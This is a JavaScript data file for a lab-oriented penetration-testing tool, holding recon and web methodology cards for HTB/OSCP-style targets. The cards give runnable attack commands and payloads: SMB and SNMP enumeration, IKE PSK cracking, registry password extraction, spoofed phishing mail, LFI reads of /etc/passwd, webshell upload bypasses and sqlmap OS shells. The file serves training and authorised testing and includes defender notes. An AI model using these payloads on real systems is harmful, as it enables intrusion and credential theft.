// Obol lane data — v0.1
// Format contract: lane-format-spec.md. Human-run commands only; no auto-execution fields.
window.OBOL_LANES = [

{ lane:'recon', phase:'Recon & Scanning', title:'Recon & Enumeration', version:0.1, cards:[

{id:'host-discovery',lane:'recon',title:'Host Discovery',hypothesis:'Before anything else you need to know what is alive in scope. ICMP echo misses hosts that block ping, so combine an ARP sweep (same broadcast domain, unfakeable) with a TCP ping sweep on common ports. In exam and lab subnets, assume some hosts only answer on TCP.',prereq:{any:['scope.defined']},produces:['host.alive'],commands:[{tool:'nmap',run:'nmap -sn {{target}}',note:'Ping sweep. Add -PR for ARP discovery on the local segment.'},{tool:'fping',run:'fping -a -g {{target}} 2>/dev/null',note:'Fast alive-host list for larger ranges.'}],expected:['is up','alive'],onFailure:{'0 hosts up':{note:'Verify your VPN connection and that the subnet is actually in scope. Check your tun IP.'}},defender:'ARP sweeps are extremely noisy on the wire; TCP ping sweeps blend into normal connection attempts.',report:{finding:'Live Host Inventory',severity:'informational'},tools:['nmap','fping'],refs:['https://github.com/nmap/nmap']},

{id:'nmap-workflow',lane:'recon',title:'Canonical Scan Workflow (single target)',hypothesis:'For a single HTB/OffSec/PNPT target, skip philosophy and run the canonical sequence: quick service scan for immediate work, full-port sweep so nothing hides, targeted scripts on everything found, UDP top-100 in the background. All output into one enum/ folder so evidence never gets lost. Use "Copy all commands" and run them in order.',prereq:{any:['scope.defined']},produces:['scan.initial','scan.full','scan.udp'],commands:[{tool:'nmap',run:'mkdir -p enum && nmap -sC -sV -oA enum/initial {{target}}',note:'Creates your enum folder and runs the baseline scan. Work from this while the next one runs.'},{tool:'nmap',run:'nmap -p- --min-rate 5000 -oA enum/allports {{target}}',note:'Full 65535 sweep. Copy the open port list into the sidebar {{ports}} parameter when it finishes.'},{tool:'nmap',run:'nmap -sC -sV -p {{ports}} -oA enum/targeted {{target}}',note:'Scripts + versions on everything the sweep found, including the weird high ports the first scan missed.'},{tool:'nmap',run:'nmap -sU --top-ports 100 -sV -oA enum/udp {{target}}',note:'UDP in the background — slow, and labs hide things there.'},{tool:'nmap',run:'nmap -p{{ports}} --script vuln -oA enum/vulns {{target}}',note:'Known-CVE detection pass. Leads to verify manually, not verdicts.'}],expected:['open','Service Info'],onFailure:{'Host seems down':{note:'Ping blocked — add -Pn to every command (make it your default habit on HTB/OffSec).'}},defender:'This sequence is maximally loud and that is fine in labs.',report:{finding:'Service Enumeration Completed',severity:'informational'},tools:['nmap'],refs:['https://github.com/nmap/nmap','https://nmap.org/book/']},

{id:'port-scan-quick',lane:'recon',title:'Initial Port Scan',hypothesis:'A fast top-ports scan with default scripts and version detection gives you the service map that drives everything else. Do this first so you have something to work from while the full scan runs.',prereq:{any:['host.alive','scope.defined']},produces:['scan.initial'],commands:[{tool:'nmap',run:'nmap -sC -sV -oA enum/initial {{target}}',note:'Default scripts + versions. The -oA output is your evidence — keep it.'},{tool:'nmap',run:'nmap -sV -sC -O --osscan-guess -oA enum/osdetect {{target}}',note:'OS fingerprint variant when you need the OS guess early.'}],expected:['open','Service Info'],onFailure:{'Note: Host seems down':{note:'Ping is blocked; add -Pn to skip host discovery.'}},defender:'Default-script scanning triggers IDS signatures immediately; in labs nobody cares, in engagements you would throttle.',report:{finding:'Service Enumeration Completed',severity:'informational'},tools:['nmap'],refs:['https://github.com/nmap/nmap']},

{id:'port-scan-full',lane:'recon',title:'Full Port Sweep',hypothesis:'Top-1000 scans miss the weird ports where labs hide the actual entry point — 5985, 8080, 46464. A full 65535 sweep at high rate, followed by a targeted script scan on what it finds, is the complete picture.',prereq:{any:['scan.initial','host.alive']},produces:['scan.full'],commands:[{tool:'nmap',run:'nmap -p- --min-rate 5000 -oA enum/allports {{target}}',note:'Full sweep, fast. Then:'},{tool:'nmap',run:'nmap -sC -sV -p {{ports}} -oA enum/targeted {{target}}',note:'Feed the discovered ports back in for scripts and versions.'}],expected:['open'],onFailure:{'0 hosts up':{note:'Add -Pn.'}},defender:'Full-range scans at high rate are unmistakable in any flow log.',report:{finding:'Full-Port Scan Completed',severity:'informational'},tools:['nmap'],refs:['https://github.com/nmap/nmap']},

{id:'udp-scan',lane:'recon',title:'UDP Scan (Top Ports)',hypothesis:'UDP is slow and everyone skips it, which is exactly why labs hide DNS, SNMP, and TFTP services there. A top-100 UDP scan catches the common cases without burning an hour.',prereq:{any:['host.alive']},produces:['scan.udp'],commands:[{tool:'nmap',run:'nmap -sU --top-ports 100 -sV -oA enum/udp {{target}}',note:'Slow; run it in the background while you work the TCP results.'}],expected:['open'],onFailure:{'all ports are open|filtered':{note:'Normal for UDP. Rate-limiting causes this; --top-ports 20 sometimes gets better answers.'}},defender:'',report:{finding:'UDP Surface Enumerated',severity:'informational'},tools:['nmap'],refs:['https://github.com/nmap/nmap']},

{id:'smb-anon-enum',lane:'recon',title:'Anonymous SMB Enumeration',hypothesis:'SMB null sessions can expose share lists, and sometimes users, groups, and password policies, with zero credentials. On Windows targets this is always one of the first three things to try.',prereq:{any:['port:445','port:139','smb.reachable']},produces:['smb.reachable','smb.shares','ad.user_list'],commands:[{tool:'nxc',run:'nxc smb {{target}} -u \'\' -p \'\'',note:'START HERE — one line validates the null session and profiles the host; tick switches below to widen the pull. nxc is the preferred SMB tool everywhere in Obol.',opts:[{flag:'--shares',tip:'share list with access levels'},{flag:'--users',tip:'domain users via SAMR'},{flag:'--pass-pol',tip:'password/lockout policy — read before any spraying'},{flag:'--groups',tip:'domain groups'},{flag:'--rid-brute',tip:'user enum by RID cycling, no creds needed on permissive DCs'}]},{tool:'smbclient',run:"smbclient -L //{{target}} -N",note:'Anonymous share listing.'},{tool:'smbmap',run:'smbmap -H {{target}} -u "" -p ""',note:'Share list with permissions — READ/WRITE columns are what matter.'},{tool:'enum4linux',run:'enum4linux -a -u "" -p "" {{target}}',note:'Full null-session pull: users, groups, policy, shares, OS.'}],expected:['Sharename','READ','ADMIN$'],onFailure:{'NT_STATUS_ACCESS_DENIED':{note:'Null sessions disabled. You need a credential before SMB gives up more.',card:'ad-user-enum'}},defender:'Event 4624 type 3 with anonymous account; share enumeration generates bursts of SMB traffic.',report:{finding:'Anonymous SMB Access',severity:'medium'},tools:['smbclient','smbmap','enum4linux','nxc'],os:['windows'],refs:['https://github.com/fortra/impacket','https://github.com/netexec-community/nxc','https://github.com/ShawnDEvans/smbmap']},

{id:'website-discovery',lane:'recon',title:'Web Service Triage',hypothesis:'Every HTTP port gets a quick triage: what stack, what title, what does it link to, does it respond differently to hostnames. Five minutes here decides whether the web lane or another lane is your entry.',prereq:{any:['port:80','port:443','port:8080','web.reachable']},produces:['web.reachable'],commands:[{tool:'whatweb',run:'whatweb http://{{target}}',note:'Stack fingerprint: server, framework, language.'},{tool:'curl',run:'curl -sI http://{{target}}',note:'Headers alone can leak framework and version.'},{tool:'curl',run:'curl -s http://{{target}} | head -100',note:'Read the actual page. Comments and links are intel.'}],expected:['HTTP/','Server:'],onFailure:{'Connection refused':{note:'Check whether it is HTTPS-only; try https:// on the same port.'}},defender:'',report:{finding:'Web Surface Identified',severity:'informational'},tools:['whatweb','curl'],refs:['https://github.com/nmap/nmap']},

{id:'nse-service-scripts',lane:'recon',title:'NSE Service Scripts (Per-Port Battery)',hypothesis:'Default scripts (-sC) barely scratch the surface. Every discovered service has a family of dedicated NSE scripts that pull far more: SMB shares and users, LDAP naming contexts, FTP anonymous access, NFS exports, database info. Run the script family that matches each open port — this is where "a scan" becomes actual enumeration.',prereq:{any:['scan.initial','scan.full']},produces:['enum.deep'],commands:[{tool:'nmap',run:'nmap -p445,139 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols {{target}}',note:'SMB family: shares, users, OS, and whether signing is required (relay relevance!).'},{tool:'nmap',run:'nmap -p389 --script "ldap* and not brute" {{target}}',note:'LDAP family: naming contexts, root DSE data — often the domain name for free.'},{tool:'nmap',run:'nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=\'{{domain}}\',userdb={{userlist}} {{target}}',note:'Kerberos username enumeration via NSE if you skipped kerbrute.'},{tool:'nmap',run:'nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst {{target}}',note:'FTP: anonymous access check is the money script.'},{tool:'nmap',run:'nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs {{target}}',note:'NFS: exports and contents. Pairs with the no_root_squash privesc card.'},{tool:'nmap',run:'nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config {{target}}; nmap -p3306 --script mysql-info,mysql-empty-password {{target}}',note:'Database families: version, config, and the eternal empty-password check.'},{tool:'nmap',run:'nmap -p5985 --script http-winrm-info {{target}}; nmap -p3389 --script rdp-enum-encryption {{target}}',note:'WinRM and RDP specifics; RDP NLA status changes your options.'}],expected:['Anonymous FTP login allowed','namingcontext'],onFailure:{'script not found':{note:'Stale or minimal nmap script DB — run nmap --script-updatedb or reinstall nmap.'}},defender:'NSE scripts are individually signatured; vuln-category scans are the loudest recon there is.',report:{finding:'Deep Service Enumeration Completed',severity:'informational'},tools:['nmap'],refs:['https://nmap.org/nsedoc/']},

{id:'nse-vuln-scan',lane:'recon',title:'Vulnerability Script Scan',hypothesis:'The vuln script category and vulners match service versions against known CVEs — a prioritized lead list of "probably vulnerable to X." These are DETECTION scripts, not exploits: they identify candidates you then verify and exploit manually, which keeps them in enumeration territory.',prereq:{any:['scan.initial','scan.full']},produces:['vuln.candidates'],commands:[{tool:'nmap',run:'nmap -p{{ports}} --script vuln {{target}}',note:'Broad vuln detection across discovered ports. Verify every hit manually before believing it.'},{tool:'nmap',run:'nmap -p{{ports}} --script vulners -sV {{target}}',note:'CVE matching by version string. False positives happen — leads, not verdicts.'},{tool:'nmap',run:'nmap -p445 --script smb-vuln-ms17-010 {{target}}',note:'EternalBlue check specifically — still planted in labs, still instant SYSTEM when present.'}],expected:['VULNERABLE','CVE-'],onFailure:{'no results':{note:'Clean does not mean secure — it means no known-CVE match. Misconfigurations never show here.'}},defender:'',report:{finding:'Known-Vulnerability Scan Results',severity:'informational'},tools:['nmap'],refs:['https://nmap.org/nsedoc/']},

{id:'dns-enum',wl:['vhosts'],lane:'recon',title:'DNS Enumeration & Zone Transfer',hypothesis:'A misconfigured DNS server hands you the entire host map via zone transfer (AXFR) — every hostname and IP in the domain in one query. Even without it, SRV records and reverse lookups reveal DCs and naming conventions.',prereq:{any:['port:53','ad.domain_known']},produces:['dns.zone','ad.host_map'],commands:[{tool:'dig',run:'dig axfr {{domain}} @{{target}}',note:'The zone transfer. If it works, you have the whole domain host inventory.'},{tool:'dnsrecon',run:'dnsrecon -d {{domain}} -n {{target}} -t axfr',note:'Structured alternative; add -D with a wordlist for subdomain brute force.'}],expected:['XFR size','IN A'],onFailure:{'Transfer failed':{note:'Normal on hardened servers. Fall back to SRV queries (_ldap._tcp, _kerberos._tcp) and subdomain brute force.'}},defender:'AXFR from an unexpected host is a classic alert; SRV queries look normal.',report:{finding:'DNS Zone Transfer Permitted',severity:'medium'},tools:['dig','dnsrecon'],refs:['https://github.com/darkoperator/dnsrecon','https://github.com/aboul3la/Sublist3r']},

{id:'snmp-enum',wl:['snmp'],lane:'recon',title:'SNMP Enumeration',hypothesis:'SNMP v1/v2 with community string "public" is a read-only shell in disguise: processes, installed software, listening ports, users, sometimes credentials in enterprise OIDs. Quick to check, frequently forgotten, occasionally decisive.',prereq:{any:['scan.udp']},produces:['snmp.access'],commands:[{tool:'onesixtyone',run:'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{target}}',note:'Community string guessing — public/private/manager catch most.'},{tool:'snmpwalk',run:'snmpwalk -v2c -c public {{target}}',note:'Full walk once you have a string. Read hrSWRunName for creds on process command lines.'}],expected:['public','iso.3.6.1'],onFailure:{'Timeout':{note:'SNMP filtered or v3-only. Note it tried and move on.'}},defender:'',report:{finding:'SNMP Information Disclosure',severity:'low'},tools:['onesixtyone','snmpwalk'],refs:['https://github.com/trailofbits/onesixtyone']},

{id:'ike-vpn',wl:['passwords'],lane:'recon',title:'IKE/IPSec VPN Enumeration',hypothesis:'UDP 500 (ISAKMP) means an IPSec VPN endpoint. Aggressive-mode IKE will hand you a PSK hash for a valid group name, and that hash cracks offline — a quiet path to VPN access that appears in the 0xdf corpus more often than you would expect.',prereq:{any:['port:500','ike.reachable']},produces:['hash.ike_psk'],commands:[{tool:'ike-scan',run:'sudo ike-scan {{target}}',note:'Main mode first: fingerprint the VPN gateway (vendor, transforms). A response confirms an endpoint.'},{tool:'ike-scan',run:'sudo ike-scan -A {{target}} --id=groupname --pskcrack=psk.txt',note:'Aggressive mode with a group-name guess. If the group is valid you get a PSK hash in psk.txt.'},{tool:'psk-crack',run:'psk-crack -d {{wordlist}} psk.txt',note:'Crack the PSK offline. ike-scan ships psk-crack for exactly this.'}],expected:['Aggressive Mode Handshake returned','SA='],onFailure:{'0 returned handshake':{note:'No IKE in main mode, or group name invalid. Brute group names with ikeforce, or try --id with common names (vpn, group, corporate).'}},defender:'UDP 500 probes log on the VPN gateway; aggressive mode is noisier than main mode.',report:{finding:'IPSec VPN Endpoint with Aggressive Mode',severity:'medium'},tools:['ike-scan','psk-crack'],os:['linux','windows'],refs:['https://github.com/royhills/ike-scan']},

{id:'finger-enum',lane:'recon',title:'Finger Service User Enumeration',hypothesis:'Port 79 (finger) still shows up on older Unix lab boxes and it is a free username oracle: finger an account and the service tells you whether it exists, often with home directory and last-login details. Valid users feed password spraying and SSH bruteforce lists.',prereq:{any:['port:79','finger.reachable']},produces:['ad.user_list','enum.usernames'],commands:[{tool:'finger',run:'finger @{{target}}',note:'Lists logged-in users. Empty result does not mean the service is useless.'},{tool:'finger',run:'finger {{user}}@{{target}}',note:'Test one known/guessed account — root is always worth trying.'},{tool:'sh',run:'for u in $(cat {{userlist}}); do finger $u@{{target}}; done | grep -v "no such user"',note:'Bulk enumeration loop. Valid accounts return login/home/shell details.'}],expected:['Login:','Directory:'],onFailure:{'Connection refused':{note:'Finger filtered or wrapped in TCP wrappers; note and move on.'}},defender:'Finger is ancient and loud in its own way; sequential queries are trivially patterned.',report:{finding:'User Enumeration via Finger Service',severity:'low'},tools:['finger'],os:['linux']},

{id:'exploit-search',lane:'recon',title:'Version-to-Exploit Research (searchsploit)',hypothesis:'Every service version from nmap -sV is a lookup key. searchsploit queries the local Exploit-DB mirror (works offline — that is the point), and 0xdf runs it against essentially every version string he sees. Discipline: search, read the exploit code, understand the bug, THEN adapt — never run blind.',prereq:{any:['web.reachable','ssh.reachable','smb.reachable','ftp.reachable']},produces:['exploit.candidate'],commands:[{tool:'searchsploit',run:'searchsploit {{service}}',note:'Paste the exact product+version from your nmap scan. Multiple queries: product alone, product+major version.'},{tool:'searchsploit',run:'searchsploit -x {{service}}',note:'Read the exploit source before touching it (-x dumps it). You are checking: is the bug real for this version, what does it change, what does it send.'},{tool:'searchsploit',run:'searchsploit -m {{service}}',note:'Mirror a copy into your working directory to edit. Never edit the system copy.'}],expected:['Shellcode:','Exploits'],onFailure:{'No Results':{note:'Try looser terms (drop the minor version), then fall back to web research and changelog reading. A version with no public exploit is common — that is normal, not failure.'}},defender:'None — local-only operation. This card is why enumeration detail matters: a bad version string wastes an hour.',report:{finding:'Public Exploit Available for Service Version',severity:'informational'},tools:['searchsploit'],os:['linux','windows'],refs:['https://www.exploit-db.com/searchsploit','https://gitlab.com/exploit-database/exploitdb']},

{id:'vnc-enum',lane:'recon',title:'VNC Enumeration',hypothesis:'VNC (5900+) shows up constantly in the corpus — sometimes with NO auth (instant desktop), sometimes with weak passwords, and TightVNC stores its password in the registry encrypted with a STATIC key (vncpwd decrypts it). Also check for RealVNC/TightVNC registry blobs during privesc looting.',prereq:{any:['port:5900','port:5901','vnc.reachable']},produces:['access.desktop','credential.candidate'],commands:[{tool:'nmap',run:'nmap -p 5900 --script vnc-info,realvnc-auth-bypass {{target}}',note:'Fingerprint auth type; the realvnc-auth-bypass script checks the ancient CVE-2006-2369.'},{tool:'vncviewer',run:'vncviewer {{target}}:5900',note:'Try no-auth first (it happens), then common passwords. VNC auth is brute-forceable offline if you capture the handshake.'},{tool:'sh',run:'reg query "HKLM\\SOFTWARE\\TightVNC\\Server" /v Password',note:'From a Windows foothold: the TightVNC password blob. Decrypt with vncpwd — fixed DES key.'}],expected:['RFB','Security types'],onFailure:{'Auth required':{note:'Capture the challenge/response with a man-in-the-middle or grab the registry blob from a foothold; VNC passwords cap at 8 chars — crack trivially.'}},defender:'VNC logs connections; failed-auth bursts are visible.',report:{finding:'VNC Service Exposure',severity:'medium'},tools:['nmap','vncviewer'],os:['windows','linux']},

{id:'smtp-enum',lane:'recon',title:'SMTP Enumeration and Mail Sending',hypothesis:'Port 25 gives you three things: username enumeration (VRFY/EXPN), credential testing without lockouts on many lab setups, and the ability to SEND mail as anyone — which lab chains use for password-reset flows, ticket-system ticket creation (request-tracker style), and delivering links a user will click.',prereq:{any:['port:25','port:587','smtp.reachable']},produces:['ad.user_list','credential.candidate'],commands:[{tool:'smtp-user-enum',run:'smtp-user-enum -M VRFY -U {{userlist}} -t {{target}}',note:'Enumerate valid mailboxes. RCPT mode if VRFY is disabled.'},{tool:'swaks',run:"swaks --auth-user '{{user}}@{{domain}}' --auth LOGIN --auth-password '{{password}}' --quit-after AUTH --server {{target}}",note:'Credential test WITHOUT sending mail (0xdf mailing method). 535 = bad creds; success = valid login.'},{tool:'swaks',run:"swaks --to {{user}}@{{domain}} --from 'it@{{domain}}' --header 'Subject: Password Reset' --body 'http://{{lhost}}/reset.html' --server {{target}}",note:'Send mail as anyone — internal phishing/reset flows in labs. Watch your listener.'}],expected:['250','235 2.7.0'],onFailure:{'502':{note:'VRFY disabled — try RCPT TO probing or EXPN.'},'535':{note:'Bad credentials.'}},defender:'VRFY bursts and spoofed From headers are visible in mail logs; SPF failures mark you.',report:{finding:'SMTP User Enumeration / Unauthenticated Relay',severity:'medium'},tools:['smtp-user-enum','swaks'],os:['linux','windows'],refs:['https://github.com/jetmore/swaks','https://github.com/pentestmonkey/smtp-user-enum']},

{id:'ftp-enum',lane:'recon',title:'FTP Enumeration',hypothesis:'Port 21 questions, in order: does anonymous login work, what is in there (configs, backups, source), and is any directory WRITABLE — and if so, does it overlap with the web root (upload a webshell, browse to it). Lab authors love the FTP→web-root pipeline.',prereq:{any:['ftp.reachable','port:21']},produces:['loot.files','credential.candidate','foothold.webshell'],commands:[{tool:'ftp',run:'ftp {{target}}',note:'Try anonymous:anonymous first. Then recursive-download everything: binary, prompt off, mget *  (or use wget -r ftp://anonymous:anonymous@{{target}}/).'},{tool:'nxc',run:"nxc ftp {{target}} -u 'anonymous' -p '' --ls",note:'NetExec lists shares/files quickly; --get to download, --put to test write access.'},{tool:'sh',run:'echo test | curl -T - ftp://{{target}}/uploads/test.txt --user anonymous:',note:'Writable directory test. If a write lands somewhere web-reachable, you have a shell path.'}],expected:['230 Login successful','Anonymous access allowed'],onFailure:{'530':{note:'No anonymous access — try found usernames with FTP; people reuse passwords everywhere.'}},defender:'Anonymous logins and mass downloads are logged; uploads to webroots are a canonical IOC.',report:{finding:'FTP Anonymous Access / Writable Directory',severity:'medium'},tools:['ftp','nxc','curl'],os:['linux','windows']}
]},

{ lane:'web', phase:'Initial Access & Web', title:'Web', version:0.1, cards:[

{id:'vhost-discovery',wl:['vhosts'],lane:'web',title:'Virtual Host Discovery',hypothesis:'Labs constantly hide entire applications behind hostnames that only resolve via vhost routing on the same IP. If the box has a domain name, fuzz the Host header — a differently-sized response means a hidden site.',prereq:{any:['web.reachable','ad.domain_known']},produces:['web.vhost'],commands:[{tool:'ffuf',run:'ffuf -u http://{{target}} -H "Host: FUZZ.{{domain}}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fs 0',note:'Filter by the default response size (-fs) so only real vhosts show. Add hits to /etc/hosts.'},{tool:'wfuzz',run:'wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.{{domain}}" --hh 0 http://{{target}}/',note:'wfuzz alternative (0xdf reaches for it often). --hh filters by response chars instead of size; calibrate against a bogus Host first.'}],expected:['Status: 200','Status: 301'],onFailure:{'all responses same size':{note:'Either no vhosts exist or your filter is wrong — calibrate -fs against a known-bad Host header first.'}},defender:'High request volume to one Host; trivially logged by the web server.',report:{finding:'Hidden Virtual Host Discovered',severity:'low'},tools:['ffuf','wfuzz'],refs:['https://github.com/OJ/gobuster','https://github.com/ffuf/ffuf']},

{id:'content-discovery',wl:['web-dirs'],lane:'web',title:'Content Discovery',hypothesis:'Applications expose far more than they link: admin panels, backups, .git directories, API routes. Fuzzing paths against the target with a good wordlist finds the unlinked surface where the entry point usually lives.',prereq:{any:['web.reachable']},produces:['web.content_map'],commands:[{tool:'feroxbuster',run:'feroxbuster -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o scans/ferox.txt',note:'Recursive, filtered. Watch for .git, backup extensions, /admin, /api, /uploads.'},{tool:'ffuf',run:'ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -of json -o scans/ffuf.json',note:'Lighter pass; JSON output ingests cleanly into the mentor drop folder.'},{tool:'gobuster',run:'gobuster dir -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -o scans/gobuster.txt',note:'The classic alternative (0xdf ran it for years before feroxbuster). -x adds extension fuzzing; -k for bad TLS certs.'}],expected:['200','301','.git'],onFailure:{'all 404':{note:'Calibrate filters on a known-bad path. Some apps soft-404 with 200 — filter by response size/words instead of status.'}},defender:'Thousands of 404s in access logs; unmistakable.',report:{finding:'Sensitive Paths Discovered via Content Discovery',severity:'low'},tools:['feroxbuster','ffuf','gobuster'],refs:['https://github.com/epi052/feroxbuster','https://github.com/OJ/gobuster','https://github.com/ffuf/ffuf']},

{id:'lfi-probe',wl:['params'],lane:'web',title:'Local File Inclusion Probe',hypothesis:'Parameters that load content by name (page=, file=, include=) are LFI candidates. A traversal payload proves it: if ../../../../etc/passwd returns the passwd file, you can read local files, which cascades into source disclosure, credential harvesting from configs, and sometimes RCE via log poisoning or wrappers.',prereq:{any:['web.parameterized','web.content_map']},produces:['web.lfi_confirmed'],commands:[{tool:'curl',run:'curl -s "http://{{target}}/index.php?page=../../../../etc/passwd"',note:'Baseline traversal. Look for root:x:0:0 in the response.'},{tool:'curl',run:'curl -s "http://{{target}}/index.php?page=....//....//....//etc/passwd"',note:'Filter bypass: doubled traversal survives naive ../ stripping.'},{tool:'curl',run:'curl -s "http://{{target}}/index.php?page=php://filter/convert.base64-encode/resource=index"',note:'PHP filter wrapper: base64-dumps source code of any page. Decode locally to read app source and harvest config creds.'}],expected:['root:x:0:0:','[boot loader]','PD9waHA'],onFailure:{'not found':{note:'Parameter may not be an include. Confirm it changes content at all before concluding no LFI.'},'WAF block or empty':{note:'Try encoding: ..%2f, ..%252f, or absolute paths /etc/passwd directly.'}},defender:'Traversal strings in access logs are a signature every WAF knows; PHP filter usage is equally obvious.',report:{finding:'Local File Inclusion',severity:'high'},tools:['curl'],refs:['https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/']},

{id:'file-upload',lane:'web',title:'File Upload Abuse',hypothesis:'Upload forms that accept scripts and store them web-reachable are instant RCE. Probe the acceptance rules first: extension blacklist vs whitelist, MIME checks, content checks. Then confirm the file landed, confirm it is reachable, and only then trigger it.',prereq:{any:['web.upload_form']},produces:['web.upload_confirmed','foothold.webshell'],commands:[{tool:'curl',run:'curl -s -F "file=@test.txt" http://{{target}}/upload.php',note:'Baseline: does a benign file upload? What does the response reveal about where it went?'},{tool:'curl',run:'curl -s -F "file=@shell.php" http://{{target}}/upload.php',note:'Try the direct route first. If blocked: shell.php.jpg, shell.phtml, shell.php%00.png, Content-Type: image/png with PHP body.'},{tool:'curl',run:'curl -s http://{{target}}/uploads/shell.php?cmd=id',note:'Readback: prove the file is reachable and executes before building on it.'}],expected:['uploaded','uid=','Success'],onFailure:{'extension not allowed':{note:'Blacklist or whitelist? Fuzz extensions with a list: php, phtml, php5, phar, and case variants.'},'file uploaded but 404 on readback':{note:'It stored outside the webroot or renamed. Probe /uploads/, /files/, /images/, and response hints for the path.'}},defender:'Web server logs show the upload POST and the subsequent GET with cmd=; file creation in webroot is a classic EDR detection.',report:{finding:'Unrestricted File Upload Leading to Code Execution',severity:'critical'},tools:['curl'],refs:['https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files']},

{id:'sqli-basics',lane:'web',title:'SQL Injection Confirmation',hypothesis:'Parameters that change query results when you add a quote are SQLi candidates. Confirm with boolean or error-based evidence manually — understand the injection before reaching for automation, because you need to know what the query looks like to exploit blind cases.',prereq:{any:['web.parameterized']},produces:['web.sqli_confirmed'],commands:[{tool:'curl',run:"curl -s 'http://{{target}}/page.php?id=1%27'",note:'Single quote. A database error message is nearly a confession.'},{tool:'curl',run:"curl -s 'http://{{target}}/page.php?id=1%20AND%201=1--%20-'",note:'Boolean pair: 1=1 renders the page, 1=2 breaks it. That difference confirms boolean-based injection.'},{tool:'curl',run:"curl -s 'http://{{target}}/page.php?id=1%20UNION%20SELECT%201,2,3--%20-'",note:'Column-count hunting: increment until the error stops. Numbers that render are your display columns.'}],expected:['SQL syntax','mysql_fetch','error in your SQL'],onFailure:{'page identical for all probes':{note:'Parameter may not reach a query, or errors are suppressed — try time-based: id=1 AND SLEEP(5).'}},defender:'Quote-heavy requests and UNION SELECT strings in logs; sqlmap has a famous user-agent and request cadence.',report:{finding:'SQL Injection',severity:'high'},tools:['curl'],refs:['https://portswigger.net/web-security/sql-injection']},

{id:'sqlmap-automation',lane:'web',title:'SQLmap Exploitation (post-confirmation)',hypothesis:'Once you have confirmed SQLi manually, sqlmap automates extraction: database dumps, OS command execution, shell staging. WARNING: sqlmap is EXPLICITLY PROHIBITED on the OSCP exam — treat this card as lab-only. In an exam context, everything sqlmap does must be done by hand (see sqli-basics). Outside the exam, prefer feeding it a captured raw request so auth cookies and parameters are exact.',prereq:{all:['web.sqli_confirmed']},produces:['db.creds','foothold.webshell'],commands:[{tool:'sqlmap',run:'sqlmap -r {{file}} --batch --level=3 --risk=2',note:'Best practice: save the raw request from Burp/your browser into a file first. --batch accepts defaults; raise level/risk only if needed.'},{tool:'sqlmap',run:'sqlmap -r {{file}} --batch --dbs',note:'Enumerate databases first, then --tables -D <db>, then --dump -T <table> -D <db>. Staged extraction keeps evidence clean.'},{tool:'sqlmap',run:'sqlmap -r {{file}} --batch --os-shell',note:'Command execution via the injection when the DB user has the rights. Check who the DB runs as first.'}],expected:['available databases','back-end DBMS'],onFailure:{'not injectable':{note:'sqlmap disagrees with your manual finding — check tamper scripts (--tamper=space2comment etc.), and whether WAF filtering needs bypassing. Trust your manual confirmation over the tool.'}},defender:'Extremely loud: distinctive user-agent, request cadence, and payload dictionary. Any WAF/IDS will see it.',report:{finding:'SQL Injection (Automated Exploitation)',severity:'high'},tools:['sqlmap'],refs:['https://sqlmap.org/','https://github.com/sqlmapproject/sqlmap']},

{id:'git-exposed',lane:'web',title:'Exposed .git Directory',hypothesis:'Deployed sites that were built by git clone sometimes ship the entire .git directory. If /.git/HEAD is readable, the full source history is recoverable — credentials in config files, deleted secrets in old commits, and the complete application logic for review.',prereq:{any:['web.reachable']},produces:['credential.candidate','web.source'],commands:[{tool:'curl',run:'curl -s http://{{target}}/.git/HEAD',note:'If this returns "ref: refs/heads/...", the directory is exposed.'},{tool:'git-dumper',run:'git-dumper http://{{target}}/.git/ gitloot',note:'Reconstructs the repo without git server cooperation.'},{tool:'sh',run:'cd gitloot && git log --oneline && git checkout . && grep -ri "pass\\|key\\|secret" .',note:'Check out the latest state, then grep for secrets; also walk old commits with git log -p.'}],expected:['ref: refs/heads'],onFailure:{'404':{note:'Not exposed, or directory listing blocked but files still fetchable — try /.git/config directly; partial exposure still leaks.'}},defender:'Web access logs show systematic .git path fetches; deployment hygiene issue.',report:{finding:'Source Code Disclosure via Exposed .git',severity:'high'},tools:['curl','git-dumper'],refs:['https://github.com/arthaud/git-dumper','https://github.com/internetwache/GitTools']},

{id:'svn-exposed',lane:'web',title:'Exposed .svn Directory',hypothesis:'The Subversion equivalent of exposed .git: /.svn/ entries and pristine copies leak the full working tree. Older projects and legacy deployments still ship it. Also check for an SVN service on 3690 — anonymous checkout is common in labs.',prereq:{any:['web.reachable','port:3690']},produces:['web.source','credential.candidate'],commands:[{tool:'curl',run:'curl -s http://{{target}}/.svn/entries',note:'If this returns entries (or a wc.db on newer svn), the metadata is exposed.'},{tool:'svn',run:'svn checkout svn://{{target}}/ repo',note:'Anonymous checkout of an exposed svn service (port 3690).'},{tool:'sh',run:'svn log repo && svn diff -r 1:HEAD repo',note:'Walk history for removed secrets, same as git log -p.'}],expected:['dir','entries'],onFailure:{'No repository found':{note:'Not anonymous, or wrong path — enumerate share/repo names via content discovery.'}},defender:'Same as .git exposure: systematic metadata fetches in access logs.',report:{finding:'Source Code Disclosure via Exposed .svn',severity:'high'},tools:['curl','svn'],refs:['https://github.com/anantshri/svn-extractor']},

